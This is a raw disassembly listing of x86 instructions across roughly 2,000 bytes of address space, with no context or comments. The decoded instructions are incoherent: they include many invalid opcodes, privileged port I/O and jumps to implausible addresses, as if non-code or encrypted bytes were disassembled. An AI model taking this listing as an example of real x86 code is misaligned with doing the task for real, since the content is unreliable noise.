  408761:	lock icebp 
  408763:	mov    eax,0xb6882422
  408768:	sbb    DWORD PTR [ebx-0x1f],eax
  40876b:	dec    ecx
  40876c:	jbe    0x40876a
  40876e:	xorps  xmm3,XMMWORD PTR [edx]
  408771:	scas   eax,DWORD PTR es:[edi]
  408772:	push   0x8458577b
  408777:	sar    DWORD PTR [edx],1
  408779:	mov    eax,0xa80b5d72
  40877e:	popa   
  40877f:	cli    
  408780:	jmp    0x408713
  408782:	xor    DWORD PTR [ecx],0x3cf520ed
  408788:	mov    ch,0xba
  40878a:	sar    BYTE PTR [ebp-0x67],0x8a
  40878e:	or     dl,0x9c
  408791:	ss inc edi
  408793:	sbb    eax,0xb3e92071
  408798:	mov    cl,0x89
  40879a:	mov    ds:0xd928b3b,eax
  40879f:	push   cs
  4087a0:	call   0xb61d819f
  4087a5:	imul   edx
  4087a7:	mov    ah,0xa
  4087a9:	cmp    BYTE PTR [esi+eax*1],0xd7
  4087ad:	mov    ah,0xc5
  4087af:	cmp    BYTE PTR [esi],dl
  4087b1:	mov    ecx,0x1285ed68
  4087b6:	mov    WORD PTR [eax-0x107b0160],cs
  4087bc:	shl    BYTE PTR [eax+0x41],cl
  4087bf:	out    dx,eax
  4087c0:	adc    DWORD PTR [edx-0x15829695],ecx
  4087c6:	(bad)
  4087ca:	in     al,0x27
  4087cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087cd:	mov    esp,ebx
  4087cf:	into   
  4087d0:	pop    ecx
  4087d1:	mov    ds:0xae9f445,al
  4087d6:	mov    eax,ds:0x2cbbb4c1
  4087db:	mov    ds:0x6230e577,al
  4087e0:	test   al,0xf
  4087e2:	dec    eax
  4087e3:	xchg   ecx,eax
  4087e4:	leave  
  4087e5:	in     eax,dx
  4087e6:	mov    gs,WORD PTR [esi-0x78aab12f]
  4087ec:	inc    ebp
  4087ed:	xchg   esp,eax
  4087ee:	test   DWORD PTR [ebx+0x4c442c23],ecx
  4087f4:	and    bl,0x70
  4087f7:	cld    
  4087f8:	out    dx,eax
  4087f9:	pop    ds
  4087fa:	push   ds
  4087fb:	(bad)  
  4087fc:	loope  0x40886a
  4087fe:	cmc    
  4087ff:	dec    esi
  408800:	stc    
  408801:	push   ss
  408802:	jmp    0x43ce0152
  408807:	pop    ss
  408808:	xchg   esp,ebx
  40880a:	sbb    BYTE PTR [ecx-0x63],ch
  40880d:	adc    al,0xcc
  40880f:	arpl   WORD PTR [esi],si
  408811:	sub    DWORD PTR [esi+ecx*4],edi
  408814:	arpl   WORD PTR [ebp+0xd],bx
  408817:	test   DWORD PTR [esi-0x7988da8f],0xd8d166b5
  408821:	or     edx,ebx
  408823:	fild   DWORD PTR [bx+di-0x64]
  408827:	xchg   edi,eax
  408828:	test   al,0x1
  40882a:	or     eax,0x4ec2631c
  40882f:	in     al,dx
  408830:	mov    ebp,0x4a62edd5
  408835:	xor    eax,0x88d0601e
  40883a:	mov    al,ds:0x87d9856d
  40883f:	sar    DWORD PTR [ebx-0x26473ef1],cl
  408845:	add    ch,0x24
  408848:	aaa    
  408849:	addr16 push ds
  40884b:	ins    DWORD PTR es:[edi],dx
  40884c:	es int3 
  40884e:	sub    BYTE PTR [ebx+0x16489b53],dl
  408854:	mov    DWORD PTR [esi+edx*1],edx
  408857:	pop    eax
  408858:	push   0xa68366
  40885d:	ja     0x408846
  40885f:	and    cl,0x48
  408862:	(bad)  
  408863:	(bad)  
  408864:	xchg   esp,eax
  408865:	stc    
  408866:	cs cmp al,0xfb
  408869:	or     BYTE PTR [ecx+0x77],0x3e
  40886d:	and    DWORD PTR [ecx],esp
  40886f:	sbb    eax,0xd76b0636
  408874:	into   
  408875:	aaa    
  408876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408877:	mov    eax,ds:0xdb36f3ae
  40887c:	dec    esi
  40887d:	sahf   
  40887e:	loop   0x408815
  408880:	bt     DWORD PTR [edi+0x30],esp
  408884:	into   
  408885:	mov    ebx,0xebd26dae
  40888a:	sbb    DWORD PTR [eax+ebp*2],ebp
  40888d:	sub    bh,0x9a
  408890:	sub    al,0xb1
  408892:	xchg   esi,eax
  408893:	xchg   edx,eax
  408894:	int    0xc0
  408896:	pop    ebp
  408897:	cwde   
  408898:	rcl    BYTE PTR [edi+ebx*4-0x6e],0x38
  40889d:	sbb    DWORD PTR [eax],eax
  40889f:	cmp    eax,0x8ae7647c
  4088a4:	loop   0x4088aa
  4088a6:	ret    
  4088a7:	sti    
  4088a8:	cmp    ch,BYTE PTR [ebx+0x5a]
  4088ab:	imul   DWORD PTR [esi]
  4088ad:	(bad)
  4088b1:	outs   dx,DWORD PTR ds:[esi]
  4088b2:	mov    ebx,0x83111d9b
  4088b7:	mov    ah,0x37
  4088b9:	(bad)  
  4088ba:	push   ss
  4088bb:	jno    0x40891d
  4088bd:	(bad)  
  4088be:	loope  0x408893
  4088c0:	inc    ecx
  4088c1:	(bad)  
  4088c2:	int3   
  4088c3:	jecxz  0x4088ef
  4088c5:	call   0xee85:0xd98359b8
  4088cc:	pop    ds
  4088cd:	stos   BYTE PTR es:[edi],al
  4088ce:	jmp    0x408888
  4088d0:	nop    DWORD PTR [ecx]
  4088d3:	les    ebp,FWORD PTR [esi+ebp*1+0x57]
  4088d7:	sbb    BYTE PTR ds:0xd949edac,0xb0
  4088de:	loop   0x408882
  4088e0:	popa   
  4088e1:	mov    bl,0xd0
  4088e3:	mov    cl,0xde
  4088e5:	jg     0x408894
  4088e7:	pop    DWORD PTR [ebp+0x36]
  4088ea:	xcrypt-ofb (bad)
  4088eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088ec:	push   0xfffffff2
  4088ee:	lahf   
  4088ef:	push   edx
  4088f0:	cld    
  4088f1:	pop    edi
  4088f2:	adc    BYTE PTR [ebx-0x52],0xe3
  4088f6:	add    al,0xdc
  4088f8:	jmp    0x2cdb:0xca72af2f
  4088ff:	enter  0xbf3e,0x1d
  408903:	push   esp
  408904:	add    BYTE PTR [ebp-0x23562529],bl
  40890a:	push   esp
  40890b:	in     al,dx
  40890c:	cli    
  40890d:	mov    esp,0x1e1f7b5
  408912:	mov    bh,0x90
  408914:	std    
  408915:	fs fsub st,st(0)
  408918:	sbb    eax,0x9792604f
  40891d:	sbb    cl,al
  40891f:	retf   0xfc0c
  408922:	imul   ebp,edi,0xb315a996
  408928:	aas    
  408929:	push   edx
  40892a:	mov    DWORD PTR [edx+0x166b818a],esp
  408930:	cld    
  408931:	pop    ds
  408932:	jg     0x4088bf
  408934:	(bad)  
  408935:	mov    eax,0x97a06bc9
  40893a:	popf   
  40893b:	xchg   BYTE PTR [ecx],bl
  40893d:	cmp    ch,BYTE PTR [ecx+eiz*4+0x30]
  408941:	sbb    edi,ebp
  408943:	fbld   TBYTE PTR [esi]
  408945:	inc    esp
  408946:	cld    
  408947:	mov    ebx,0x553e5678
  40894c:	mov    ds:0x4da17336,eax
  408951:	stos   BYTE PTR es:[edi],al
  408952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408953:	loop   0x408996
  408955:	mov    edi,0x57748d6b
  40895a:	cmp    BYTE PTR [esi+0x40f81929],ah
  408960:	or     ch,BYTE PTR [edi]
  408962:	ins    BYTE PTR es:[edi],dx
  408963:	xor    esp,DWORD PTR [ebp+0x10bf448c]
  408969:	mov    esi,0x4893c29
  40896e:	lods   al,BYTE PTR ds:[esi]
  40896f:	adc    eax,0x24b38484
  408974:	inc    edx
  408975:	loopne 0x408959
  408977:	jno    0x4089bc
  408979:	sub    eax,0xea1ce5b0
  40897e:	ret    0x9aa8
  408981:	icebp  
  408982:	cld    
  408983:	adc    BYTE PTR [esi],bh
  408985:	or     eax,0x3aa8ae73
  40898a:	push   0x7c
  40898c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40898d:	mov    ds,esp
  40898f:	ja     0x40896c
  408991:	adc    edi,0x5a
  408994:	data16 daa 
  408996:	out    0xff,eax
  408998:	mov    bl,0xfb
  40899a:	cli    
  40899b:	mov    al,BYTE PTR [edx+esi*4-0x4653ce6b]
  4089a2:	test   DWORD PTR ds:0xe99b6a7c,edi
  4089a8:	aad    0x1f
  4089aa:	icebp  
  4089ab:	mov    ecx,0x6d01e2f9
  4089b0:	dec    ecx
  4089b1:	or     al,0x47
  4089b3:	xor    bh,BYTE PTR [ebx+ebx*4+0x5b]
  4089b7:	cmp    BYTE PTR [edx+0x3c],ah
  4089ba:	mov    al,ds:0x9d83b604
  4089bf:	cld    
  4089c0:	cmp    DWORD PTR [edi-0x73],0x46
  4089c4:	repnz push ds
  4089c6:	scas   al,BYTE PTR es:[edi]
  4089c7:	clc    
  4089c8:	xchg   edx,eax
  4089c9:	iret   
  4089ca:	sub    eax,0x869e932b
  4089cf:	jo     0x4089a5
  4089d1:	jle    0x4089e9
  4089d3:	sbb    dl,cl
  4089d5:	add    BYTE PTR [ecx+ecx*1-0xdf3e56d],0x63
  4089dd:	xchg   ebx,eax
  4089de:	inc    eax
  4089df:	cld    
  4089e0:	mov    ebp,0xc085b1c0
  4089e5:	pop    edi
  4089e6:	and    al,0xb4
  4089e8:	mov    edx,0x156fdeb1
  4089ed:	pop    esi
  4089ee:	imul   esi,ebx,0xeda25352
  4089f4:	or     cl,BYTE PTR ds:0xb2a6499b
  4089fa:	stc    
  4089fb:	xor    BYTE PTR [edi+0x59],dh
  4089fe:	sbb    al,0x5d
  408a00:	or     BYTE PTR [edx],dh
  408a02:	dec    ebx
  408a03:	mov    bl,0xd4
  408a05:	add    al,0xfb
  408a07:	xor    eax,0x6da95c1
  408a0c:	leave  
  408a0d:	xchg   edi,eax
  408a0e:	mov    esp,0x5459db0d
  408a13:	dec    ecx
  408a14:	and    eax,0x347e7380
  408a19:	jns    0x4089db
  408a1b:	sbb    BYTE PTR [eax],ah
  408a1d:	les    eax,FWORD PTR [ebx+0x38866203]
  408a23:	cmp    al,dh
  408a25:	cmp    al,0x27
  408a27:	icebp  
  408a28:	(bad)  
  408a29:	jl     0x4089ce
  408a2b:	xchg   DWORD PTR [ebp+0x64],edi
  408a2e:	cmp    eax,0x1e1f7831
  408a33:	mov    gs,WORD PTR [esi+ebp*2]
  408a36:	sar    DWORD PTR [eax+0x68377b93],cl
  408a3c:	xchg   edx,eax
  408a3d:	add    BYTE PTR [ebx],bl
  408a3f:	jne    0x408a92
  408a41:	loopne 0x408a9b
  408a43:	push   ebp
  408a44:	ret    0xe849
  408a47:	mov    esi,0x8a5ea70d
  408a4c:	push   ebx
  408a4d:	(bad)  
  408a4e:	jp     0x408a05
  408a50:	push   ds
  408a51:	ss in  al,dx
  408a53:	call   0x53ff:0xdef0876
  408a5a:	sar    ebp,0x37
  408a5d:	xchg   ecx,eax
  408a5e:	adc    BYTE PTR [edi+0xa0542b1],cl
  408a64:	push   cs
  408a65:	mov    dh,0x22
  408a67:	aad    0xd8
  408a69:	fisttp DWORD PTR [eax+0x5d]
  408a6c:	loopne 0x408ad1
  408a6e:	(bad)  
  408a6f:	hlt    
  408a70:	enter  0x635,0x68
  408a74:	repnz cmp BYTE PTR [esi+0x55],dh
  408a78:	ins    DWORD PTR es:[edi],dx
  408a79:	xchg   ecx,eax
  408a7a:	call   0x3610c7eb
  408a7f:	sbb    esp,DWORD PTR [edi+edi*2]
  408a82:	leave  
  408a83:	inc    ebx
  408a84:	call   0xf7246440
  408a89:	xchg   edi,eax
  408a8a:	dec    esi
  408a8b:	xor    cl,BYTE PTR [ebx+0x35]
  408a8e:	rcl    edi,cl
  408a90:	icebp  
  408a91:	sub    eax,0xebdfcaaf
  408a96:	cli    
  408a97:	pop    esp
  408a98:	pop    ecx
  408a99:	addr16 push edi
  408a9b:	cld    
  408a9c:	pop    edx
  408a9d:	and    al,0xde
  408a9f:	xor    BYTE PTR [edx],bh
  408aa1:	mov    ebx,0x82d904bc
  408aa6:	lock or eax,0x13586c2f
  408aac:	adc    esp,DWORD PTR [edx+0x4f614245]
  408ab2:	xor    eax,0x3c406986
  408ab7:	jne    0x408ade
  408ab9:	je     0x408b13
  408abb:	sbb    BYTE PTR [edx-0x1f],bl
  408abe:	adc    dl,BYTE PTR [eax*4-0x603663b2]
  408ac5:	jb     0x408a7e
  408ac7:	mov    ds:0x79995f0a,eax
  408acc:	pusha  
  408acd:	push   edx
  408ace:	and    DWORD PTR [edi-0x5e31bb78],ebx
  408ad4:	push   ebx
  408ad5:	repz push ebp
  408ad7:	ja     0x408abb
  408ad9:	jge    0x408ad9
  408adb:	lea    esp,[ebp+0x2c]
  408ade:	fadd   QWORD PTR [ecx]
  408ae0:	dec    ebp
  408ae1:	hlt    
  408ae2:	retf   0x814
  408ae5:	xchg   edx,eax
  408ae6:	daa    
  408ae7:	scas   al,BYTE PTR es:[edi]
  408ae8:	fsubr  st,st(1)
  408aea:	in     al,dx
  408aeb:	dec    ebp
  408aec:	ds hlt 
  408aee:	imul   ebx,DWORD PTR [eax],0x6e883621
  408af4:	push   esi
  408af5:	jo     0x408b65
  408af7:	scas   eax,DWORD PTR es:[edi]
  408af8:	jge    0x408ac1
  408afa:	xchg   esp,eax
  408afb:	mov    edx,esp
  408afd:	(bad)  
  408afe:	jge    0x408ad7
  408b00:	inc    edx
  408b01:	retf   0x10a4
  408b04:	dec    eax
  408b05:	sti    
  408b06:	cmp    bl,BYTE PTR [edx]
  408b08:	fwait
  408b09:	xor    DWORD PTR [edx-0x1317137c],0xaf319244
  408b13:	test   ebp,ebp
  408b15:	sub    eax,0x3ba01eb4
  408b1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b1b:	rol    BYTE PTR [edi-0x7a],cl
  408b1e:	jbe    0x408b54
  408b20:	jle    0x408b1e
  408b22:	jecxz  0x408b86
  408b24:	add    dl,ah
  408b26:	lea    edx,[ebp-0x40]
  408b29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b2a:	mov    ch,0xa7
  408b2c:	leave  
  408b2d:	outs   dx,DWORD PTR ds:[esi]
  408b2e:	sub    eax,0x49f349ec
  408b33:	mov    edx,0x76064af1
  408b38:	cmp    ch,BYTE PTR [eax-0x5b14cb41]
  408b3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b3f:	push   ss
  408b40:	push   ebp
  408b41:	(bad)
  408b44:	inc    esi
  408b45:	xor    ah,BYTE PTR [ecx+edx*1+0x132bd4a0]
  408b4c:	and    DWORD PTR [esi],ebp
  408b4e:	push   es
  408b4f:	lahf   
  408b50:	push   edi
  408b51:	hlt    
  408b52:	mov    edi,DWORD PTR [eax]
  408b54:	fidiv  WORD PTR [edi-0x7b]
  408b57:	and    esp,DWORD PTR [edi]
  408b59:	xor    ecx,DWORD PTR [esi]
  408b5b:	arpl   WORD PTR [eax],bp
  408b5d:	aaa    
  408b5e:	in     al,0xbb
  408b60:	ret    
  408b61:	and    eax,ebx
  408b63:	xor    al,0xa9
  408b65:	imul   ebx,DWORD PTR [edx],0x7c
  408b68:	sbb    eax,0x5380cc18
  408b6d:	fdivr  DWORD PTR [ebp-0x18788b9]
  408b73:	mov    esi,0xda4d19f9
  408b78:	mov    esp,0x47abbd00
  408b7d:	dec    eax
  408b7e:	(bad)  
  408b7f:	scas   eax,DWORD PTR es:[edi]
  408b80:	out    dx,al
  408b81:	fcmovne st,st(1)
  408b84:	sub    BYTE PTR [ebp+eax*8+0x733e5e62],0x4b
  408b8c:	push   0xffffffd8
  408b8e:	push   eax
  408b8f:	mov    dl,0x20
  408b91:	in     al,dx
  408b92:	inc    edi
  408b93:	cmp    BYTE PTR [eax+0x5],bh
  408b96:	mov    al,0xde
  408b98:	dec    esi
  408b99:	cli    
  408b9a:	aad    0xb7
  408b9c:	and    DWORD PTR [eax-0x62372549],ebx
  408ba2:	dec    esi
  408ba3:	test   BYTE PTR [ebx],cl
  408ba5:	stos   DWORD PTR es:[edi],eax
  408ba6:	ss call 0x608d:0xf7603697
  408bae:	xchg   BYTE PTR ds:0x48ad690c,bl
  408bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bb5:	arpl   WORD PTR [edx+0x266001e6],sp
  408bbb:	mov    BYTE PTR [edx-0x3289569e],cl
  408bc1:	lahf   
  408bc2:	push   esi
  408bc3:	push   eax
  408bc4:	sub    BYTE PTR [ecx-0x181d3f94],ah
  408bca:	add    BYTE PTR [eax],0xd7
  408bcd:	das    
  408bce:	aad    0xa7
  408bd0:	and    al,0x7a
  408bd2:	jns    0x408c00
  408bd4:	mov    eax,0x3a9aa508
  408bd9:	iret   
  408bda:	stos   BYTE PTR es:[di],al
  408bdc:	test   al,0x7a
  408bde:	js     0x408c20
  408be0:	imul   ecx,ebp,0x77e6e017
  408be6:	xor    BYTE PTR [ebx],bh
  408be8:	pop    esp
  408be9:	xor    eax,0xaca6cf8d
  408bee:	ret    
  408bef:	aas    
  408bf0:	pop    ds
  408bf1:	push   esp
  408bf2:	mov    bh,BYTE PTR ss:[esi+0x11]
  408bf6:	stos   DWORD PTR es:[edi],eax
  408bf7:	fld    DWORD PTR [eax-0x24]
  408bfa:	add    ecx,DWORD PTR [esi+0x2f45be6d]
  408c00:	jbe    0x408c7f
  408c02:	jae    0x408bae
  408c04:	idiv   DWORD PTR [esi-0x2b]
  408c07:	jmp    0xc7b9:0xa8cdaaa0
  408c0e:	fwait
  408c0f:	das    
  408c10:	mov    bh,0x1e
  408c12:	icebp  
  408c13:	pop    edx
  408c14:	shr    BYTE PTR [esi-0x49],cl
  408c17:	test   DWORD PTR [ebp-0x6021e389],esi
  408c1d:	xchg   edx,eax
  408c1e:	sbb    edx,edi
  408c20:	ins    BYTE PTR es:[edi],dx
  408c21:	mov    esp,0x76921333
  408c26:	push   cs
  408c27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c28:	call   0xede3051b
  408c2d:	and    BYTE PTR [edx+0x48bf198a],0xf2
  408c34:	aad    0x52
  408c36:	outs   dx,DWORD PTR ds:[esi]
  408c37:	or     DWORD PTR [ecx+eax*1],0xd49f6231
  408c3e:	dec    ebx
  408c3f:	aam    0xe1
  408c41:	push   0xcd2aa1a7
  408c46:	aas    
  408c47:	adc    dh,0x95
  408c4a:	pop    eax
  408c4b:	jne    0x408bd5
  408c4d:	scas   al,BYTE PTR es:[edi]
  408c4e:	or     ch,al
  408c50:	ins    BYTE PTR es:[edi],dx
  408c51:	dec    esi
  408c52:	adc    esp,DWORD PTR [ebx+0x232ef8f4]
  408c58:	xor    DWORD PTR [esp+esi*1],0xfde38f4a
  408c5f:	or     al,0xa6
  408c61:	shl    BYTE PTR [ebx+0x79a49cd1],0xec
  408c68:	push   0xffffff9a
  408c6a:	inc    edx
  408c6b:	sub    DWORD PTR [esi+eax*1],ecx
  408c6e:	dec    ebp
  408c6f:	ins    DWORD PTR es:[edi],dx
  408c70:	push   0xd5f03932
  408c75:	jno    0x408c49
  408c77:	loop   0x408c8c
  408c79:	and    ebx,edi
  408c7b:	and    BYTE PTR [ebp+0x5a],ch
  408c7e:	dec    edi
  408c7f:	inc    edi
  408c80:	jg     0x408cdf
  408c82:	iret   
  408c83:	mov    ah,0x0
  408c85:	ds popa 
  408c87:	mov    cl,0x2
  408c89:	cmp    ebp,DWORD PTR [esi+0x70b518d]
  408c8f:	daa    
  408c90:	or     al,0x74
  408c92:	popa   
  408c93:	jp     0x408c96
  408c95:	inc    ebx
  408c96:	scas   al,BYTE PTR es:[edi]
  408c97:	sbb    dh,BYTE PTR [eax]
  408c99:	mov    esp,0x43c4dd52
  408c9e:	sub    ebp,DWORD PTR [esp+ebp*1]
  408ca1:	out    0xb1,al
  408ca3:	stos   BYTE PTR es:[edi],al
  408ca4:	and    al,0xd0
  408ca6:	or     ecx,esp
  408ca8:	loopne 0x408c44
  408caa:	ins    DWORD PTR es:[edi],dx
  408cab:	and    BYTE PTR [ecx],0x2b
  408cae:	push   ecx
  408caf:	fdiv   st(6),st
  408cb1:	mov    ch,al
  408cb3:	nop
  408cb4:	imul   esi,ebx,0x9067e28b
  408cba:	rol    dh,1
  408cbc:	mov    esi,0x6f7dba5e
  408cc1:	pop    ebp
  408cc2:	cld    
  408cc3:	add    eax,0xc53917d1
  408cc8:	fidivr WORD PTR [esi-0x56dc0f10]
  408cce:	(bad)  
  408ccf:	jae    0x408c5f
  408cd1:	pushf  
  408cd2:	add    BYTE PTR [ecx],ch
  408cd4:	mov    ds:0xb4394f70,al
  408cd9:	or     BYTE PTR [ebx-0x25127964],bl
  408cdf:	out    dx,eax
  408ce0:	sub    al,0x87
  408ce2:	xchg   ecx,eax
  408ce3:	push   ss
  408ce4:	ss shr bl,0xe0
  408ce8:	xchg   esp,eax
  408ce9:	cmp    dh,BYTE PTR [edx-0x43]
  408cec:	and    ebx,DWORD PTR [ebp+0x25]
  408cef:	and    BYTE PTR [ebx+0xf],dh
  408cf2:	pop    ecx
  408cf3:	stos   DWORD PTR es:[edi],eax
  408cf4:	inc    edi
  408cf5:	pop    ebx
  408cf6:	inc    esi
  408cf7:	sbb    al,0xeb
  408cf9:	pop    ebp
  408cfa:	inc    eax
  408cfb:	fadd   DWORD PTR [eax]
  408cfd:	and    al,0x69
  408cff:	jge    0x408d13
  408d01:	sbb    cl,cl
  408d03:	dec    eax
  408d04:	fwait
  408d05:	fs pop ebp
  408d07:	inc    ebp
  408d08:	dec    esp
  408d09:	sub    BYTE PTR [ecx-0x38c12e56],bh
  408d0f:	jnp    0x408ca1
  408d11:	les    ebp,FWORD PTR [eax-0x105c7e4a]
  408d17:	inc    edi
  408d18:	pop    ds
  408d19:	idiv   BYTE PTR [esi+0x3d]
  408d1c:	and    cl,BYTE PTR [eax+eax*1+0x43f1427a]
  408d23:	mov    dl,0x1a
  408d25:	sti    
  408d26:	fmul   QWORD PTR fs:[eax+0x29728f7d]
  408d2d:	push   edi
  408d2e:	inc    esp
  408d2f:	mov    al,ds:0xb0f307fc
  408d34:	jnp    0x408db0
  408d36:	in     eax,0x4a
  408d38:	or     al,BYTE PTR [edi]
  408d3a:	icebp  
  408d3b:	xor    BYTE PTR [edi+0x16],al
  408d3e:	cmp    ecx,DWORD PTR [esi]
  408d40:	and    al,BYTE PTR [edi]
  408d42:	fstp   DWORD PTR [ecx+0x28cc38a3]
  408d48:	push   esp
  408d49:	xchg   esp,eax
  408d4a:	hlt    
  408d4b:	xor    DWORD PTR [eax+esi*1+0x35719ddf],eax
  408d52:	mov    ds:0x4528db4e,al
  408d57:	fbstp  TBYTE PTR ds:0xee1c1aea
  408d5d:	jp     0x408cf5
  408d5f:	jmp    0xd85306e1
  408d64:	and    eax,0xa3fcdf4d
  408d69:	daa    
  408d6a:	adc    DWORD PTR ds:0x1aa4ed57,0x8f569e96
  408d74:	add    edx,DWORD PTR [edi]
  408d76:	sbb    edi,ebx
  408d78:	(bad)  
  408d79:	lods   al,BYTE PTR ds:[esi]
  408d7a:	push   0xfffffffc
  408d7c:	stos   DWORD PTR es:[edi],eax
  408d7d:	icebp  
  408d7e:	inc    esp
  408d7f:	mov    DWORD PTR [esi+0x37],ebx
  408d82:	pop    esi
  408d83:	add    al,0x14
  408d85:	sbb    eax,eax
  408d87:	mov    ecx,0xba0edea9
  408d8c:	inc    ecx
  408d8d:	bound  ebx,QWORD PTR [ecx]
  408d8f:	xchg   ecx,eax
  408d90:	or     dh,BYTE PTR [eax+0x59]
  408d93:	lahf   
  408d94:	dec    ebp
  408d95:	mov    edi,0x60649aa5
  408d9a:	and    cl,BYTE PTR cs:[eax]
  408d9d:	mov    ds:0x328c7ce5,eax
  408da2:	or     bh,BYTE PTR [edi-0x7f]
  408da5:	ret    0x7ec1
  408da8:	inc    edx
  408da9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408daa:	jmp    0x61b73902
  408daf:	(bad)  
  408db0:	mov    bl,0x3f
  408db2:	mov    dl,0x18
  408db4:	dec    ebx
  408db5:	pop    ebp
  408db6:	aas    
  408db7:	pushf  
  408db8:	dec    esi
  408db9:	je     0x408d6c
  408dbb:	xchg   ebp,eax
  408dbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dbd:	jns    0x408dd1
  408dbf:	cwde   
  408dc0:	icebp  
  408dc1:	cmp    DWORD PTR [ebx-0x53],esp
  408dc4:	sub    BYTE PTR [ebx+eiz*2+0x741046e7],cl
  408dcb:	pop    eax
  408dcd:	int    0x3c
  408dcf:	sbb    al,0xc7
  408dd1:	not    BYTE PTR [ebp-0x63032c8b]
  408dd7:	ds pop edx
  408dd9:	add    DWORD PTR [ebx-0x66],ecx
  408ddc:	sub    al,BYTE PTR [ecx+0x7b41ecee]
  408de2:	and    al,0xf0
  408de4:	mov    al,bl
  408de6:	repz dec esi
  408de8:	popf   
  408de9:	cmp    dh,al
  408deb:	imul   edx,DWORD PTR [ecx+0x5019edd6],0x35a74c9c
  408df5:	xor    al,bl
  408df7:	or     DWORD PTR [eax+0x7fa714e9],ecx
  408dfd:	dec    edx
  408dfe:	hlt    
  408dff:	sub    BYTE PTR [edi+0x1b75dfc0],0xa3
  408e06:	not    BYTE PTR [esp+esi*2+0x357258cf]
  408e0d:	cmp    BYTE PTR [ebx-0x7f],0x2d
  408e11:	inc    edx
  408e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e13:	je     0x408e3e
  408e15:	je     0x408da1
  408e17:	lock and al,0x9a
  408e1a:	cld    
  408e1b:	dec    ebp
  408e1c:	out    dx,eax
  408e1d:	(bad)  
  408e1f:	push   edx
  408e20:	dec    ebx
  408e21:	in     al,dx
  408e22:	ror    DWORD PTR [esp+esi*2-0x68463b49],0xf9
  408e2a:	into   
  408e2b:	int3   
  408e2c:	lods   al,BYTE PTR ds:[esi]
  408e2d:	popa   
  408e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e2f:	mov    al,ds:0x8a98d844
  408e34:	sub    DWORD PTR [ecx-0x26],0x690b1b25
  408e3b:	loop   0x408e21
  408e3d:	push   edx
  408e3e:	cmc    
  408e3f:	pop    es
  408e40:	pop    edx
  408e41:	inc    eax
  408e42:	lock jns 0x408e23
  408e45:	aad    0xc3
  408e47:	sbb    al,0xa
  408e49:	jb     0x408eb7
  408e4b:	dec    edi
  408e4c:	inc    ebx
  408e4d:	mov    eax,ds:0xf63ab95e
  408e52:	loope  0x408e24
  408e54:	pop    ebx
  408e55:	cli    
  408e56:	aas    
  408e57:	pusha  
  408e58:	adc    ecx,DWORD PTR [ecx-0x5c19f8dd]
  408e5e:	pop    ss
  408e5f:	sbb    ebx,DWORD PTR [esi]
  408e61:	gs pusha 
  408e63:	inc    esi
  408e64:	inc    edi
  408e65:	and    ebp,DWORD PTR [ebx-0x56]
  408e68:	mul    BYTE PTR [esi]
  408e6a:	mov    DWORD PTR [edi],0x845e695a
  408e70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e71:	mov    ch,0xe3
  408e73:	dec    ecx
  408e74:	jno    0x408e68
  408e76:	and    ebp,DWORD PTR [ebp-0x4164c9e7]
  408e7c:	(bad)  
  408e7e:	add    al,0x30
  408e80:	or     al,0x26
  408e82:	jb     0x408e40
  408e84:	imul   BYTE PTR ds:0x2d44d56c
  408e8a:	sub    dl,al
  408e8c:	cmp    al,0x26
  408e8e:	mov    edx,0xa7fc5dc8
  408e93:	cmc    
  408e94:	pop    edi
  408e95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e96:	fdiv   QWORD PTR [ebx+ecx*2+0x47]
  408e9a:	out    dx,al
  408e9b:	addr16 out 0xe2,al
  408e9e:	push   edi
  408e9f:	ja     0x408eb9
  408ea1:	xchg   dl,ch
  408ea3:	test   eax,0x5a13c5b2
  408ea9:	dec    esp
  408eaa:	xor    DWORD PTR [edi],edi
  408eac:	test   BYTE PTR [edi],ah
  408eae:	dec    ebx
  408eaf:	jne    0x408ed8
  408eb1:	dec    esp
  408eb2:	ret    
  408eb3:	shl    DWORD PTR [ebp+0x6e],0x90
  408eb7:	inc    edx
  408eb8:	(bad)  
  408eb9:	xchg   edi,eax
  408eba:	add    DWORD PTR [ebx],esi
  408ebc:	cld    
  408ebd:	leave  
  408ebe:	xor    ebx,eax
  408ec0:	(bad)  
  408ec2:	sub    eax,0xfb96f2ea
  408ec7:	inc    edx
  408ec8:	xor    DWORD PTR [esi],edi
  408eca:	and    BYTE PTR [esi],0xd8
  408ecd:	xor    edx,eax
  408ecf:	mov    dh,0x5e
  408ed1:	xchg   edi,eax
  408ed2:	jbe    0x408f17
  408ed4:	dec    edx
  408ed5:	mov    edi,0xc063630f
  408eda:	inc    ecx
  408edb:	jne    0xe9d7b63a
  408ee1:	jl     0x408f46
  408ee3:	push   esp
  408ee4:	popf   
  408ee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ee6:	mov    al,ds:0x234c4bf9
  408eeb:	dec    edx
  408eec:	fld    DWORD PTR [eax-0x5f]
  408eef:	mov    edi,0xad753e85
  408ef4:	(bad)  [edx+ebx*4+0x26]
  408ef8:	and    BYTE PTR [edx],dh
  408efa:	pop    edx
  408efb:	rcr    DWORD PTR [ebx],0x24
  408efe:	lock scas eax,DWORD PTR es:[edi]
  408f00:	mov    ah,0xdf
  408f02:	jb     0x408f62
  408f04:	jae    0x408f0e
  408f06:	repnz mov ds:0xabd618f2,eax
  408f0c:	adc    BYTE PTR [esi+0xebfbf6f],cl
  408f12:	jns    0x408f0f
  408f14:	lods   al,BYTE PTR ds:[esi]
  408f15:	sti    
  408f16:	into   
  408f17:	mov    ds:0xd47b562c,eax
  408f1c:	add    al,0x1e
  408f1e:	or     dh,BYTE PTR [ebp-0x2c139f04]
